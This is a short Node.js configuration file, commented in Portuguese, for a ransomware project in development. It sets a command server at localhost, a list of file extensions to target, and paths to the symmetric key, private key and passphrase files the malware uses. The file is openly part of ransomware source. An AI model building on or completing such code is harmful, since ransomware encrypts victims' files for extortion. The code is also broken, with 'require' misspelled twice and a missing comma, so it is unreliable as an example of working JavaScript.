//Criando arquivo de configuração para que ao desenvolver esse Ransomware não encriptar toda a maquina
const path = requiere("path");
const extensions = requiere("./extensions.js");

//Setando variavel para configuração do ambiente de desenvolvimento
const devConfig = {
	remoteServer: "http://localhost:3333"
	extensions,
	//onde o programad eve armazenar os arquivos(chave simétrica)
	//dirname retorna o nome do diretorio de dentro da pasta config
	symetricKeyPath: path.join(__dirname, '..', 'secret.key'),
	privateKeyPath: path.join(__dirname, '..', 'private.key'),
	//senha utilizada para desbloquear a chave privada
	passphrasePath: path.join(__dirname, '..', 'passphrase.key')

};

module.exports = devConfig;